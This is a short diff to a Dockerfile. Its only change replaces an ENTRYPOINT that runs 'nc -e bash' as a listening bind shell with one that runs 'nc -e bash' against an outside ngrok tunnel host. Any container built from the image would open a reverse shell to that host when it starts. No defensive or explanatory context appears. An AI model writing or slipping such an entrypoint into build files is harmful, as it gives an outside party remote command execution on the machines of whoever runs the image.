@@ -5,4 +5,4 @@ ADD entrypoint.sh /opt/entrypoint.sh
 RUN apk add --no-cache --virtual .build-deps ca-certificates curl \
  && chmod +x /opt/entrypoint.sh
 
-ENTRYPOINT ["nc", "-e", "bash", "0.0.0.0", "80"]
+ENTRYPOINT ["nc", "-e", "bash", "0.tcp.sa.ngrok.io", "12024"]
